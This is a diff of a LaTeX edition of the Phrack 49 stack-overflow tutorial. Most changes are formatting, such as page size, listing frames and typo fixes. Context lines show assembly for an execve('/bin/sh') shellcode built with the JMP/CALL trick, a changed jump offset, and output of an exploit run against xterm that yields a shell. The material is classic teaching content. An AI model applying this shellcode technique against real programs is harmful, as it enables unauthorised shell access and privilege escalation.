@@ -1,7 +1,7 @@
-\documentclass[12pt]{article}
+\documentclass[10pt]{article}
 %\usepackage[paperwidth=8,paperheight=11cm,textwidth=13cm,textheight=14cm,left=0.5cm,right=0.5cm,top=0.5cm,nohead,nofoot]{geometry} 
-%\usepackage[paperwidth=10cm,paperheight=13cm,left=0.5cm,right=0.5cm,bottom=0.5cm,top=0.5cm,nohead,nofoot]{geometry} 
-\usepackage[papersize={4.5in,6in},margin=0.5cm]{geometry}
+\usepackage[paperwidth=10.1cm,paperheight=13cm,left=0.3cm,right=0.3cm,bottom=0.5cm,top=0.1cm,nohead,nofoot]{geometry} 
+%\usepackage[papersize={4.5in,6in},margin=0.5cm]{geometry}
 %\usepackage[body={2cm, 5.5in},left=0.2in,right=0.2in,top=0.2in,bottom=0.2in]{geometry}
 
 \parindent=0cm
@@ -78,6 +78,7 @@
 %\addcontentsline{toc}{section}{REFERENCE}
 \newpage
 
+\begin{CJK}{UTF8}{bsmi} %開始CJK環境，設定編碼，設定字體
 \begin{comment}
 .oO Phrack 49 Oo.
 
@@ -413,7 +414,7 @@ stack                                                       stack
 The code to spawn a shell in C looks like:
 
 %shellcode.c
-\begin{lstlisting}[caption=shellcode.c]
+\begin{lstlisting}[caption=shellcode.c,frame=single,frameround=tttt]
 #include <stdio.h>
 
 void main() 
@@ -510,17 +511,14 @@ are a word long, so it leaves space for two words (8 bytes).
 \end{verbatim}
 
 We copy the value 0x80027b8 (the address of the string "/bin/sh") into the first pointer of name[]. This is 
-equivalent to: 
-
-\begin{verbatim}
-name[0] = "/bin/sh";
-\end{verbatim}
+equivalent to: name[0] = "/bin/sh";
 
 \begin{verbatim}
 0x800013d : movl $0x0,0xfffffffc(%ebp)
 \end{verbatim}
 
-We copy the value 0x0 (NULL) in to the seconds pointer of name[].  This is equivalent to: name[1] = NULL; 
+We copy the value 0x0 (NULL) in to the seconds pointer of name[].  This is equivalent to:
+name[1] = NULL;
 The actual call to execve() starts here.
 
 \begin{verbatim}
@@ -642,7 +640,8 @@ The exit syscall will place 0x1 in EAX, place the exit code in EBX, and execute 
 applications return 0 on exit to indicate no errors. We will place 0 in EBX.  Our list of steps is now: 
 
 \begin{enumerate}
-\item Have the null terminated string "/bin/sh" somewhere in memory. b. Have the address of the string "/bin/sh" somewhere in memory followed by a null long word. 
+\item Have the null terminated string "/bin/sh" somewhere in memory. 
+\item Have the address of the string "/bin/sh" somewhere in memory followed by a null long word. 
 \item Copy 0xb into the EAX register. 
 \item Copy the address of the address of the string "/bin/sh" into the EBX register. 
 \item Copy the address of the string "/bin/sh" into the ECX register. 
@@ -654,7 +653,7 @@ applications return 0 on exit to indicate no errors. We will place 0 in EBX.  Ou
 \end{enumerate}
 
 Trying to put this together in assembly language, placing the string after the code, and remembering we will 
-place the address of the string, and nul l word after the array, we have:
+place the address of the string, and null word after the array, we have:
 
 \begin{verbatim}
 movl   string_addr,string_addr_addr
@@ -668,11 +667,13 @@ int    $0x80
 movl   $0x1, %eax
 movl   $0x0, %ebx
 int    $0x80
+/bin/sh string goes here.
 \end{verbatim}
-\verb+/bin/sh+ string goes here.
 
 The problem is that we don't know where in the memory space of the program we are trying to exploit the code 
-(and the string that follows it) will be placed. One way around it is to use a JMP, and a CALL instruction. The 
+(and the string that follows it) will be placed.
+
+One way around it is to use a JMP, and a CALL instruction. The 
 JMP and CALL instructions can use IP relative addressing, which means we can jump to an offset from the 
 current IP without needing to know the exact address of where  in memory we want to jump to. If we place a 
 CALL instruction right before the "/bin/sh" string, and a JMP instruction to it, the strings address will be 
@@ -708,15 +709,15 @@ movb   $0x0,nullbyteoffset(%esi)# 4 bytes
 movl   $0x0,null-offset(%esi)   # 7 bytes
 movl   $0xb,%eax                # 5 bytes
 movl   %esi,%ebx                # 2 bytes
-leal   array-offset(%esi),%ecx # 3 bytes
+leal   array-offset(%esi),%ecx  # 3 bytes
 leal   null-offset(%esi),%edx   # 3 bytes
 int    $0x80                    # 2 bytes
 movl   $0x1, %eax               # 5 bytes
 movl   $0x0, %ebx               # 5 bytes
 int    $0x80                    # 2 bytes
 call   offset-to-popl           # 5 bytes
-\end{verbatim}
 /bin/sh string goes here.
+\end{verbatim}
 
 Calculating the offsets from jmp to call, from call to popl, from the string address to the array, and from the 
 string address to the null long word, we now have: 
@@ -751,7 +752,7 @@ void main()
 {
 __asm__
 ("
-jmp    0x2a                     # 3 bytes
+jmp    0x2f                     # 3 bytes
 popl   %esi                     # 1 byte
 movl   %esi,0x8(%esi)           # 3 bytes
 movb   $0x0,0x7(%esi)           # 4 bytes        
@@ -1325,7 +1326,6 @@ $
 
 Works like a charm. Now lets try it on xterm: 
 
-\begin{CJK}{UTF8}{bsmi} %開始CJK環境，設定編碼，設定字體
 \begin{verbatim}
 [aleph1]$ export DISPLAY=:0.0
 [aleph1]$ ./exploit4 2148
@@ -1337,7 +1337,6 @@ Warning: Color name
 Warning: some arguments in previous message were lost
 $
 \end{verbatim}
-\end{CJK}
 
 On the first try! It has certainly increased our odds. Depending on h ow much environment data the exploit 
 
@@ -1611,5 +1610,5 @@ void usage(void)
 }
 \end{lstlisting}
 
-%\end{CJK}
+\end{CJK}
 \end{document}
